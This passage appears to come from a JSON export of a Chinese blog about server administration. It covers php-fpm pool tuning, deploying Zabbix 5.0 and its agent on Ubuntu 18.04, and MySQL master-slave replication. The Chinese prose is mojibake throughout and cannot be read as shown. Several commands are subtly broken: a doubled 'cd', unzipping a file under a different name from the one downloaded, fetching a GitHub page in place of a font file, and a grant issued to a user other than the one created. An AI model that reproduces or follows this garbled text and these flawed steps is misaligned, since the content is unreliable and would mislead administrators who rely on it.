alertï¼šå¿…é¡»ç«‹å³å¤„ç† errorï¼šé”™è¯¯æƒ…å†µ warningï¼šè­¦å‘Šæƒ…å†µ noticeï¼šä¸€èˆ¬é‡è¦ä¿¡æ¯ debugï¼šè°ƒè¯•ä¿¡æ¯ process_maxï¼šæ§åˆ¶æœ€å¤§å­è¿›ç¨‹æ•°çš„å…¨å±€å˜é‡ï¼Œä¸å»ºè®®è®¾ç½®å…·ä½“æ•°é‡ï¼Œå› ä¸ºä¼šé™åˆ¶æ‰©å±•é…ç½®ã€‚ daemonizeï¼šæ˜¯å¦å¼€å¯å®ˆæŠ¤è¿›ç¨‹ï¼Œé»˜è®¤ä¸ºyes é€šå¸¸ä¸ä¼šåœ¨php-fpm.confä¸­è®¾å®š process_maxï¼Œå› ä¸ºä¼šé™åˆ¶www.confä¸­çš„é…ç½®ã€‚ 3. æ‰©å±•é…ç½®æ–‡ä»¶æ‰©å±•é…ç½®æ–‡ä»¶www.confé€šå¸¸æ˜¯ä¸php-fpmæœåŠ¡ç›¸å…³çš„é…ç½®ï¼Œå¤§éƒ¨åˆ†ä¼˜åŒ–éƒ½æ˜¯éœ€è¦æ›´æ”¹è¿™ä¸ªé…ç½®æ–‡ä»¶ã€‚ 123456789101112# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conflisten &#x3D; 127.0.0.1:9000slowlog &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;www-slow.log# è¿™é‡ŒæŒ‰ç…§10G çš„ç©ºé—²å†…å­˜å»è®¾å®špm &#x3D; dynamicpm.start_servers &#x3D; 16pm.max_children &#x3D; 256pm.min_spare_servers &#x3D; 16pm.max_spare_servers &#x3D; 32pm.max_requests &#x3D; 1000 å‚æ•°è§£æï¼š listenï¼šæœ‰ä¸¤ç§æ–¹å¼å¯ä»¥è¿›è¡Œé€šè®¯ã€‚ socketï¼šunix:/run/php/php7.3-fpm.sock httpï¼š127.0.0.1:9000 å› ä¸ºphp-fpmä¸ngx_fastcgi_modulçš„é€šè®¯æ–¹å¼æ˜¯ 9000ç«¯å£ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ 127.0.0.1:9000 slowlogï¼šæ…¢æŸ¥è¯¢æ—¥å¿—è·¯å¾„ pmï¼šè¿›ç¨‹ç®¡ç†æ–¹å¼ staticï¼šé™æ€æ¨¡å¼ã€‚å§‹ç»ˆä¿æŒå›ºå®šæ•°é‡çš„å­è¿›ç¨‹æ•°ï¼Œé…åˆæœ€å¤§å­è¿›ç¨‹æ•°ä¸€èµ·ä½¿ç”¨ï¼Œè¿™ä¸ªæ–¹å¼å¾ˆä¸çµæ´»ï¼Œé€šå¸¸ä¸æ˜¯é»˜è®¤ã€‚ pm.max_childrenï¼šæœ€å¤§å­è¿›ç¨‹æ•°ã€‚ dynamicï¼šåŠ¨æ€æ¨¡å¼ã€‚æŒ‰ç…§å›ºå®šçš„æœ€å°å­è¿›ç¨‹æ•°å¯åŠ¨ï¼ŒåŒæ—¶ç”¨æœ€å¤§å­è¿›ç¨‹æ•°å»é™åˆ¶ã€‚ pm.start_serversï¼šé»˜è®¤å¼€å¯çš„è¿›ç¨‹æ•° pm.min_spare_serversï¼šæœ€å°ç©ºé—²çš„è¿›ç¨‹æ•° pm.max_spare_serversï¼šæœ€å¤§ç©ºé—²çš„è¿›ç¨‹æ•° pm.max_childrenï¼šæœ€å¤§å­è¿›ç¨‹æ•° pm.max_requestsï¼šæ¯ä¸ªè¿›ç¨‹èƒ½å“åº”çš„è¯·æ±‚æ•°é‡ï¼Œè¾¾åˆ°æ­¤é™åˆ¶ä¹‹åï¼Œè¯¥PHP è¿›ç¨‹å°±ä¼šè¢«è‡ªåŠ¨é‡Šæ”¾æ‰ã€‚ nodaemonizeï¼šæ¯ä¸ªè¿›ç¨‹åœ¨é—²ç½®ä¸€å®šæ—¶å€™åå°±ä¼šè¢«æ€æ‰ã€‚ pm.max_childrenï¼šæœ€å¤§å­è¿›ç¨‹æ•° pm.process_idle_timeoutï¼šåœ¨å¤šå°‘ç§’ä¹‹åï¼Œä¸€ä¸ªç©ºé—²çš„è¿›ç¨‹å°†ä¼šè¢«æ€æ­» æ³¨æ„ï¼šmax_children æ˜¯ PHPFPM Pool æœ€å¤§çš„å­è¿›ç¨‹æ•°ï¼Œå®ƒçš„æ•°å€¼å–å†³äºæœåŠ¡å™¨å®é™…ç©ºé—²å†…å­˜ã€‚å‡è®¾ä½ æœ‰ä¸€å°10G è¿è¡Œå†…å­˜çš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªç©ºé—²çš„PHP è¿›ç¨‹å ç”¨çš„æ˜¯ 1M å†…å­˜ï¼Œè€Œä¸€ä¸ªæ­£åœ¨å¤„ç†è¯·æ±‚çš„PHP è¿›ç¨‹ å¤§æ¦‚ä¼šå ç”¨10M-40Må†…å­˜ï¼Œè¿™é‡ŒæŒ‰ç…§æ¯ä¸ªPHP è¯·æ±‚å ç”¨ 40M å†…å­˜ï¼Œé‚£ä¹ˆmax_children = 10*1024M/40M = 256ï¼Œæ‰€ä»¥è¿™ä¸ªå€¼å¾—æ ¹æ®å®é™…ç¯å¢ƒè€Œè®¾å®šã€‚ ä»¥ä¸Šå°±æ˜¯php-fpm åˆå§‹åŒ–é…ç½®çš„æ ¸å¿ƒéƒ¨åˆ†äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"Zabbix å¿«é€Ÿä¸Šæ‰‹â€”â€”éƒ¨ç½²","slug":"zabbix-quick-start","date":"2020-09-05T00:49:02.000Z","updated":"2020-12-06T15:14:35.561Z","comments":true,"path":"zabbix-quick-start/","link":"","permalink":"https://www.0x2beace.com/zabbix-quick-start/","excerpt":"å› ä¸ºä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œéƒ¨åˆ†ç¯å¢ƒä¸æ˜¯æ­å»ºåœ¨äº‘ä¸Šé¢ï¼Œè€Œæ˜¯åœ¨æ‰˜ç®¡çš„å®ä½“æœºä¸Šé¢ï¼Œè¿™å°±å¯¼è‡´åŸæœ¬å¾ˆå¤šäº‘å¯ä»¥å¸®æˆ‘ä»¬åšçš„äº‹æƒ…ï¼Œç°åœ¨åªèƒ½è‡ªå·±å»åšäº†ã€‚æ¯”å¦‚ï¼šç›‘æ§ç³»ç»Ÿã€‚ æœ¬ç€ä¸æƒ³å½“è¿ç»´çš„å‰ç«¯ä¸æ˜¯ä¸€ä¸ªå¥½å…¨æ ˆçš„æ€æƒ³ï¼Œæˆ‘è¿«åˆ‡éœ€è¦è‡ªå·±æ­å»ºä¸€å¥—å®Œæ•´çš„ç›‘æ§ç³»ç»Ÿæ¥è§£æ”¾è‡ªå·±çš„åŒæ‰‹ğŸ‘ï¸ã€‚","text":"å› ä¸ºä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œéƒ¨åˆ†ç¯å¢ƒä¸æ˜¯æ­å»ºåœ¨äº‘ä¸Šé¢ï¼Œè€Œæ˜¯åœ¨æ‰˜ç®¡çš„å®ä½“æœºä¸Šé¢ï¼Œè¿™å°±å¯¼è‡´åŸæœ¬å¾ˆå¤šäº‘å¯ä»¥å¸®æˆ‘ä»¬åšçš„äº‹æƒ…ï¼Œç°åœ¨åªèƒ½è‡ªå·±å»åšäº†ã€‚æ¯”å¦‚ï¼šç›‘æ§ç³»ç»Ÿã€‚ æœ¬ç€ä¸æƒ³å½“è¿ç»´çš„å‰ç«¯ä¸æ˜¯ä¸€ä¸ªå¥½å…¨æ ˆçš„æ€æƒ³ï¼Œæˆ‘è¿«åˆ‡éœ€è¦è‡ªå·±æ­å»ºä¸€å¥—å®Œæ•´çš„ç›‘æ§ç³»ç»Ÿæ¥è§£æ”¾è‡ªå·±çš„åŒæ‰‹ğŸ‘ï¸ã€‚ æˆ‘å¸Œæœ›è¿™å¥—ç›‘æ§ç³»ç»Ÿæ˜¯æ€æ ·çš„ï¼Ÿ å…è´¹å¼€æº å…¥é—¨ç›¸å¯¹å®¹æ˜“ æ”¯æŒå¤šå¹³å°åˆ†å¸ƒå¼ç›‘æ§ ç»¼åˆä»¥ä¸Šéœ€æ±‚ï¼Œæœ€åæˆ‘é€‰æ‹©äº† Zabbix ã€‚ ç½‘ä¸Šæ‰¾äº†ä¸€åœˆï¼Œå¹¶æ²¡æœ‰å‘ç°åˆé€‚çš„å…¥é—¨æ•™ç¨‹ï¼Œè¦ä¹ˆæ˜¯æ•™ç¨‹å¤ªè€äº†ï¼Œè¦ä¹ˆæ˜¯å†™çš„ä¸å¤Ÿè¯¦ç»†ï¼Œå­¦ä¹ æ›²çº¿å¾ˆé™¡ï¼Œå…‰æ˜¯éƒ¨ç½²å°±å¾ˆè´¹åŠ²ï¼Œè€ŒZabbix é‡è¦çš„ä¸æ˜¯éƒ¨ç½²ï¼Œè€Œæ˜¯å­¦ä¼šå¦‚ä½•ä½¿ç”¨ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°å°±æ˜¯ç”¨æ¥è®°å½•å¦‚ä½•å¿«é€Ÿéƒ¨ç½² Zabbixã€‚ è®¤è¯† ZabbixZabbix æ˜¯ä¸€ä¸ªä¼ä¸šçº§çš„åˆ†å¸ƒå¼å¼€æºç›‘æ§æ–¹æ¡ˆã€‚ ä¸€ä¸ªå®Œæ•´çš„ç›‘æ§ç³»ç»Ÿæ˜¯ç”±æœåŠ¡æœºï¼ˆzabbix serverï¼‰å’Œå®¢æˆ·æœºï¼ˆzabbix zgentï¼‰ç»„æˆï¼Œè¿è¡Œå¤§æ¦‚æµç¨‹æ˜¯è¿™æ ·çš„ï¼š zabbix agent éœ€è¦å®‰è£…åˆ°è¢«ç›‘æ§çš„ä¸»æœºä¸Šï¼Œå®ƒè´Ÿè´£å®šæœŸæ”¶é›†å„é¡¹æ•°æ®ï¼Œå¹¶å‘é€åˆ° zabbix server ç«¯ï¼Œzabbix serverå°†æ•°æ®å­˜å‚¨åˆ°è‡ªå·±çš„æ•°æ®åº“ä¸­ï¼Œzabbix webæ ¹æ®æ•°æ®åœ¨å‰ç«¯è¿›è¡Œå±•ç°å’Œç»˜å›¾ã€‚è¿™é‡Œ agent æ”¶é›†æ•°æ®åˆ†ä¸ºä¸»åŠ¨å’Œè¢«åŠ¨ä¸¤ç§æ¨¡å¼ï¼š ä¸»åŠ¨ï¼šagent è¯·æ±‚server è·å–ä¸»åŠ¨çš„ç›‘æ§é¡¹åˆ—è¡¨ï¼Œå¹¶ä¸»åŠ¨å°†ç›‘æ§é¡¹å†…éœ€è¦æ£€æµ‹çš„æ•°æ®æäº¤ç»™ server/proxy ã€‚ è¢«åŠ¨ï¼šserver å‘agentè¯·æ±‚è·å–ç›‘æ§é¡¹çš„æ•°æ®ï¼Œagentè¿”å›æ•°æ®ã€‚ å·¥ä½œåŸç†ï¼š å®‰è£…ç³»ç»Ÿç¯å¢ƒï¼š Ubuntu 18.04 LTS Mysql 5.7 PHP 7.2 Nginx Zabbix 5.0 1. å®‰è£…æ•°æ®åº“åœ¨æ­£å¼å®‰è£…ä¹‹å‰ï¼Œè¿™é‡Œæ¨èå…ˆå»å®˜ç½‘æ‰¾åˆ°ç¬¦åˆè‡ªå·±çš„ Zabbix æœåŠ¡å™¨å¹³å°ã€‚ æ ¹æ®è‡ªå·±çš„å®é™…ç¯å¢ƒæ¥æ‰¾åˆ°å±äºè‡ªå·±çš„ä¸‹è½½é“¾æ¥ï¼Œæ¯”å¦‚æˆ‘æ˜¯Zabbix 5.0 + Ubuntu 18.04 + Mysql + Nginxï¼Œæ‰€ä»¥æˆ‘çš„å®‰è£…æ–¹å¼åº”è¯¥æ˜¯ï¼š 123$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb$ dpkg -i zabbix-release_5.0-1+bionic_all.deb$ apt update 2. å®‰è£…Zabbix serverï¼ŒWebå‰ç«¯ï¼Œagent1$ apt install zabbix-server-mysql zabbix-frontend-php zabbix-nginx-conf zabbix-agent Zabbix Serverï¼šç”¨æ¥æ¥æ”¶å¹¶å¤„ç† Zabbix agent ä¼ è¿‡æ¥çš„æ•°æ® Web å‰ç«¯ï¼šZabbix çš„äº¤äº’ç•Œé¢ Zabbix agentï¼šéœ€è¦è¢«ç›‘æ§çš„ä¸»æœº 3. åˆå§‹æ•°æ®åº“å®‰è£…å®Œæ•°æ®åº“ä¹‹åï¼Œå¹¶ä¸èƒ½ç›´æ¥ç™»å½•ï¼Œå› ä¸ºä¸çŸ¥é“root ç”¨æˆ·çš„å¯†ç ï¼Œæ‰€ä»¥éœ€è¦é‡ç½®root ç”¨æˆ·çš„å¯†ç ï¼Œé‡ç½®çš„æ–¹å¼æœ‰å¤šç§ï¼Œè¿™é‡Œæ¨èæˆ‘å¸¸ä½¿ç”¨çš„çš„ä¸€ç§ã€‚ 123456# vim &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;mysql.conf # ä¹Ÿè®¸ä½ ç¼–è¾‘çš„é…ç½®æ–‡ä»¶å’Œæˆ‘çš„åç§°ä¸ä¸€æ ·ï¼Œä¸è¿‡æ²¡å…³ç³»ã€‚# æ·»åŠ ä¸‹é¢ä¸¤è¡Œé…ç½®[mysqld]skip-grant-tables é‡å¯Mysql æœåŠ¡ï¼š 1$ service mysql restart ç°åœ¨çš„root ç”¨æˆ·å·²ç»æ²¡æœ‰å¯†ç äº†ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥è¦åšçš„å°±æ˜¯ä¿®æ”¹root ç”¨æˆ·å¯†ç ï¼š 123$ mysql -hlocalhost -uroot -pmysql &gt; UPDATE mysql.user SET authentication_string&#x3D;PASSWORD(&#39;password&#39;), plugin&#x3D;&#39;mysql_native_password&#39; WHERE User&#x3D;&#39;root&#39; AND Host&#x3D;&#39;localhost&#39;; ç„¶åå†æ¬¡ä¿®æ”¹åˆšæ‰çš„é…ç½®æ–‡ä»¶ï¼Œå°†ä¸‹é¢é‚£è¡Œé…ç½®ç»™æ³¨é‡Šæ‰ï¼Œ æœ€åé‡å¯Mysql æœåŠ¡å°±å¯ä»¥äº†ã€‚ Mysql é»˜è®¤ç”¨æˆ·æ˜¯rootï¼Œè¿™é‡Œä¸æ¨èç›´æ¥ä½¿ç”¨ root ç”¨æˆ·å»ç®¡ç† zabbix æ•°æ®åº“ï¼Œæ‰€ä»¥è¿˜æ˜¯ä½¿ç”¨å®˜æ–¹æ¨èçš„æ–¹å¼ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·å»ç®¡ç†ï¼š 1234567$ mysql -hlocalhost -uroot -pmysql&gt; create database zabbix character set utf8 collate utf8_bin;mysql&gt; create user zabbix@localhost identified by &#39;password&#39;;mysql&gt; grant all privileges on zabbix.* to zabbix@localhost;mysql&gt; flush privileges;mysql&gt; quit; è¿™é‡Œé»˜è®¤Mysql æ˜¯è¿è¡Œåœ¨æœ¬åœ°æœºå™¨ä¸Šï¼Œå¦‚æœMysql è¿è¡Œåœ¨å®¹å™¨ä¸­ï¼Œè€ŒZabbix åˆè¿è¡Œåœ¨æœ¬æœºä¸Šï¼Œå¯èƒ½ä¼šå‡ºç°ä¸€äº›å¼‚å¸¸ï¼ˆæˆ‘é‡åˆ°äº†ä½†æ²¡èƒ½è§£å†³ï¼‰ã€‚ å¯¼å…¥åˆå§‹æ¶æ„å’Œæ•°æ®ã€‚ 1$ zcat &#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-server-mysql*&#x2F;create.sql.gz | mysql -uzabbix -p zabbix 4. é…ç½®æ•°æ®åº“ä¸ºZabbix serveré…ç½®æ•°æ®åº“ï¼Œ 123# vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_server.confDBPassword&#x3D;password 5. é…ç½®Web12345# vim &#x2F;etc&#x2F;zabbix&#x2F;nginx.conf# å»æ‰å‰é¢çš„æ³¨é‡Šï¼Œæ¢æˆä½ è‡ªå·±çš„ç«¯å£æˆ–è€…åŸŸåã€‚# listen 80;# server_name example.com; 6. é…ç½®æ—¶åŒº123# vim &#x2F;etc&#x2F;zabbix&#x2F;php-fpm.confphp_value[date.timezone] &#x3D; Asia&#x2F;Shanghai 7. å¯åŠ¨æœåŠ¡å¯åŠ¨Zabbix serverå’Œagent è¿›ç¨‹ï¼Œå¹¶ä¸ºå®ƒä»¬è®¾ç½®å¼€æœºè‡ªå¯ï¼š 12$ systemctl restart zabbix-server zabbix-agent nginx php7.2-fpm$ systemctl enable zabbix-server zabbix-agent nginx php7.2-fpm ä¸€åˆ‡å‡†å¤‡å°±ç»ªä¹‹åï¼Œå°±å¯ä»¥è®¿é—®äº†ï¼šhttp://server_ip_or_nameï¼Œå¦‚æœä½ ä¸Šé¢é…ç½®çš„ä¸æ˜¯80 ç«¯å£ï¼Œé‚£å¾—è®°å¾—åŠ ä¸Šå¯¹åº”çš„ç«¯å£ã€‚å¦‚æœä½ ä¸èƒ½æ­£å¸¸è®¿é—®ï¼Œé‚£å¯èƒ½æ˜¯å› ä¸ºé˜²ç«å¢™æ²¡æœ‰å…è®¸è¯¥ç«¯å£ã€‚ åˆæ¬¡è¿›æ¥ï¼Œéœ€è¦é…ç½®ç›¸å…³å‚æ•°ï¼Œç¡®è®¤æ— è¯¯ä¹‹åï¼Œç‚¹å‡» Next stepã€‚ Zabbix é»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯Adminã€zabbixï¼Œé¡ºåˆ©ç™»å½•åˆ°åå°ä¹‹åï¼Œè®°å¾—ä¿®æ”¹é»˜è®¤ç™»å½•å¯†ç ã€‚ é…ç½®ä¸­æ–‡è¯­è¨€åŒ…å¦‚æœéœ€è¦è®¾ç½®ä¸­æ–‡ç‰ˆçš„ç¯å¢ƒï¼Œéœ€è¦åšä¸€äº›é¢å¤–çš„é…ç½®ã€‚ 1$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;locales.inc.php å°†zh_CN åé¢å‚æ•°æ”¹ä¸º trueã€‚ å¦‚æœåœ¨é€‰æ‹©è¯­è¨€æ—¶ï¼Œå‘ç°è¿˜æ˜¯ä¸èƒ½é€‰æ‹©ï¼Œå¹¶ä¸”æç¤ºï¼š You are not able to choose some of the languages, because locales for them are not installed on the web server. è¿™æ˜¯å› ä¸ºä½ ç³»ç»Ÿé‡Œæ²¡ä¸­æ–‡ç¯å¢ƒï¼ŒæŸ¥çœ‹å½“å‰çš„æ‰€æœ‰ç³»ç»Ÿè¯­è¨€ç¯å¢ƒ 1$ locale -a 1. å®‰è£…ä¸­æ–‡åŒ…1apt-get install language-pack-zh-hant language-pack-zh-hans 2. é…ç½®ç¯å¢ƒå˜é‡å¢åŠ è¯­è¨€å’Œç¼–ç çš„è®¾ç½®ï¼š 1234# vim &#x2F;etc&#x2F;environmentLANG&#x3D;&quot;zh_CN.UTF-8&quot;LANGUAGE&#x3D;&quot;zh_CN:zh:en_US:en&quot; 3. æ›¿æ¢Zabbix è¯­è¨€åŒ…12345$ cd cd &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;locale&#x2F;zh_CN&#x2F;LC_MESSAGES$ wget https:&#x2F;&#x2F;github.com&#x2F;echohn&#x2F;zabbix-zh_CN&#x2F;archive&#x2F;v0.1.0.zip$ unzip master.zip$ rm frontend.mo$ cp zabbix-zh_CN-master&#x2F;frontend.mo frontend.mo 4. è§£å†³ä¹±ç é—®é¢˜12345$ wget https:&#x2F;&#x2F;github.com&#x2F;chenqing&#x2F;ng-mini&#x2F;blob&#x2F;master&#x2F;font&#x2F;msyh.ttf$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;defines.inc.php# æ‰¾åˆ° define(&#39;ZBX_GRAPH_FONT_NAME&#39;, &#39;graphfont&#39;);# å°†graphfont æ›¿æ¢æˆ msyh 5. æ›´æ–°mibs åº“1$ apt-get install snmp-mibs-downloader 6. é‡å¯æœåŠ¡1$ systemctl restart zabbix-server zabbix-agent php7.2-fpm è‡³æ­¤Zabbix çš„å®Œæ•´éƒ¨ç½²è¿‡ç¨‹å°±å…¨ä»‹ç»å®Œäº†ã€‚ å‚è€ƒé“¾æ¥ Zabbix 3.0 for Ubuntu 14.04 LTS å®‰è£… ä¸‹è½½å®‰è£…Zabbixâ€”â€”Zabbix å®˜ç½‘ ä¼ä¸šçº§åˆ†å¸ƒå¼ç›‘æ§ç³»ç»Ÿâ€“zabbix","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"},{"name":"ç›‘æ§ç³»ç»Ÿ","slug":"ç›‘æ§ç³»ç»Ÿ","permalink":"https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"}]},{"title":"Zabbix å¿«é€Ÿä¸Šæ‰‹â€”â€”æ·»åŠ Agent ä¸»æœº","slug":"zabbix-add-agent-host","date":"2020-09-04T13:48:16.000Z","updated":"2020-09-08T13:03:21.864Z","comments":true,"path":"zabbix-add-agent-host/","link":"","permalink":"https://www.0x2beace.com/zabbix-add-agent-host/","excerpt":"Zabbix-Server å®‰è£…å®Œæˆä¹‹åï¼Œä¸‹ä¸€æ­¥éœ€è¦æ·»åŠ ä¸»æœºæ‰èƒ½çœ‹åˆ°æ•°æ®ã€‚","text":"Zabbix-Server å®‰è£…å®Œæˆä¹‹åï¼Œä¸‹ä¸€æ­¥éœ€è¦æ·»åŠ ä¸»æœºæ‰èƒ½çœ‹åˆ°æ•°æ®ã€‚ å®‰è£…Zabbix AgentZabbix Agent çš„ä½œç”¨æ˜¯å°†æœåŠ¡å™¨çš„æ•°æ®å‘é€ç»™ Zabbix Serverï¼Œæ‰€ä»¥åªéœ€è¦åœ¨éœ€è¦ç›‘æ§çš„ä¸»æœºä¸Šå®‰è£… Zabbix Agent å°±å¤Ÿäº†ã€‚ å› ä¸ºæˆ‘çš„ç¯å¢ƒæ˜¯ï¼šUbuntu 18.04ã€Nginxã€Mysqlã€PHPï¼Œæ ¹æ®å®˜ç½‘çš„é€‰æ‹©å¯¹åº”çš„ä¸‹è½½é“¾æ¥ã€‚ åœ¨æœ‰äº†Mysql å’Œ Nginxçš„æƒ…å†µä¸‹ï¼Œè¿™é‡Œæˆ‘åªé€‰æ‹©å®‰è£… Zabbix Agentï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œé‚£å°±éœ€è¦é¢å¤–å®‰è£…zabbix-mysqlã€zabbix-nginx-confã€zabbix-frontend-phpã€‚ 1234$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb$ dpkg -i zabbix-release_5.0-1+bionic_all.deb$ apt update$ apt install zabbix-agent é…ç½® Zabbix Agent12345# vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.confServerï¼šZabbix Server çš„IP åœ°å€ServerActiveï¼šZabbix Server çš„IP åœ°å€Hostnameï¼šZabbix Agent è¿™å°ä¸»æœºçš„åˆ«å æ ¸å¿ƒçš„é…ç½®åªæœ‰è¿™ä¸‰è¡Œï¼Œæ”¹å®Œä¹‹åï¼Œé‡å¯ä»¥ä¸‹ Zabbix Agentã€‚ 1$ systemctl restart zabbix-agent æ·»åŠ ä¸»æœºå®Œæˆä»¥ä¸Šé…ç½®ä¹‹åï¼Œä¸‹ä¸€æ­¥éœ€è¦åšçš„å°±æ˜¯æ‰“å¼€ Zabbix çš„Web ç«¯ï¼Œå¼€å§‹æ·»åŠ ä¸»æœºã€‚ é…ç½®ä¸»æœºåŸºç¡€ä¿¡æ¯ï¼š ä¸»æœºåç§°ï¼šzabbix_agentd.conf ä¸­çš„Hostname å®¢æˆ·ç«¯IPï¼šéœ€è¦ç›‘æ§çš„ä¸»æœºçš„IP åœ°å€ ç«¯å£é»˜è®¤ä½¿ç”¨ 10050 é…ç½®æ¨¡ç‰ˆï¼š éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ²¡æœ‰é…ç½®æ¨¡ç‰ˆï¼Œå¯èƒ½ä¼šå¯¼è‡´æ²¡æœ‰æ•°æ®ã€‚ ç„¶åç‚¹å‡»æ·»åŠ å³å¯ã€‚ æ‰“å¼€ç›‘æ§é¢æ¿ï¼Œç‚¹å‡»ä¸»æœºï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸»æœºçŠ¶æ€åº”è¯¥æ˜¯è¿™æ ·çš„ã€‚ è‡³æ­¤å°±å®Œæˆäº†Agent çš„æ·»åŠ ï¼Œç‚¹å‡»æœ€æ–°æ•°æ®æˆ–è€…å›¾å½¢å¯ä»¥çœ‹åˆ°ç›¸åº”çš„æ•°æ®ã€‚ å‚è€ƒé“¾æ¥ å®‰è£…zabbix-agentå¹¶æ·»åŠ åˆ°zabbix webä¸­ç›‘æ§ Zabbix ä½¿ç”¨ Zabbix-Agent æ·»åŠ æ–°çš„LinuxæœåŠ¡å™¨ç›‘æ§","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"Mysql ä¸»ä»æ¶æ„é…ç½®","slug":"mysql-master-slave-architecture-configuration","date":"2020-09-03T15:40:16.000Z","updated":"2020-09-03T15:43:51.804Z","comments":true,"path":"mysql-master-slave-architecture-configuration/","link":"","permalink":"https://www.0x2beace.com/mysql-master-slave-architecture-configuration/","excerpt":"Mysql ä¸»ä»é…ç½®æ˜¯æ•°æ®åº“åŒæ­¥çš„å¿…è¦æ­¥éª¤ã€‚","text":"Mysql ä¸»ä»é…ç½®æ˜¯æ•°æ®åº“åŒæ­¥çš„å¿…è¦æ­¥éª¤ã€‚ ä¸»æœºç¯å¢ƒï¼š Ubuntu 18.04 LTS Mysql 5.7 ä¸‹é¢ä¼šå°†ä¸»æ•°æ®åº“ç®€ç§°ä¸ºMasterï¼Œä»æ•°æ®åº“ç®€ç§°ä¸º Slaveã€‚ é…ç½®Master1234567# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf# æ‰“å¼€äºŒè¿›åˆ¶æ—¥å¿—[mysqld]server_id&#x3D;1log-bin&#x3D;master-binlog-bin-index&#x3D;master-bin.index åˆ›å»ºåŒæ­¥ç”¨æˆ·ï¼Œå¹¶èµ‹äºˆæƒé™ï¼ˆå¦‚æœä»æœåŠ¡å™¨ä»¥reql è¿™ä¸ªè´¦å·è¿›è¡Œè¿æ¥ï¼Œå°±èµ‹äºˆåŒæ­¥æ•°æ®åº“çš„æƒé™ï¼Œå¹¶ä¸”è¿™ä¸ªæƒé™æ˜¯æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰æ•°æ®è¡¨ï¼‰ 1234$ mysql -uroot -p mysql&gt; create user repl;mysql&gt; grant replication slave on *.* to &#39;user&#39;@&#39;your_slave_addr&#39; identified by &#39;password&#39;mysql&gt; flush privileges; ä¸Šé¢çš„IP æ˜¯æŒ‡ Slave æœåŠ¡å™¨çš„IP åœ°å€ã€‚é‡å¯Mysql æœåŠ¡ã€‚ æŸ¥çœ‹Master é…ç½®ï¼š 1mysql&gt; show master status; Salve é…ç½®1234567# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf# æ‰“å¼€relay æ—¥å¿—[mysqld]server_id&#x3D;2relay-log-index&#x3D;slave-relay-bin.indexrelay-log&#x3D;slave-relay-bin é‡å¯Mysql æœåŠ¡ã€‚ æŒ‡å®šMaster ä¸»æœº 12$ mysql -uroot -pmysql&gt; change master to master_host&#x3D;&quot;your master ip &quot;, master_port&#x3D;3306, master_user&#x3D;&#39;repl&#39;,master_password&#x3D;&#39;password&#39;,master_log_file&#x3D;&#39;master-bin.000001&#39;,master_log_pos&#x3D;0; å‚æ•°è¯´æ˜ï¼š master_hostï¼šMasterâˆ‘ä¸»æœºçš„å¤–ç½‘IP åœ°å€ master_portï¼šç«¯å£ master_userï¼šMasterä¸»æœºä¸Šè¿›è¡ŒåŒæ­¥çš„ç”¨æˆ· master_passwordï¼šå¯†ç  master_log_fileï¼šMaster è¾“å‡ºçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°ï¼ˆåœ¨Master ä¸»æœºä¸Šä½¿ç”¨show master statuså‘½ä»¤æŸ¥çœ‹ï¼‰ master_log_posï¼šå“ªé‡Œå¼€å§‹åŒæ­¥ å¼€å¯ä¸»ä»åŒæ­¥ 1mysql&gt; start slave; æŸ¥çœ‹ä»åº“åŒæ­¥çŠ¶æ€ 1mysql&gt; show slave status; 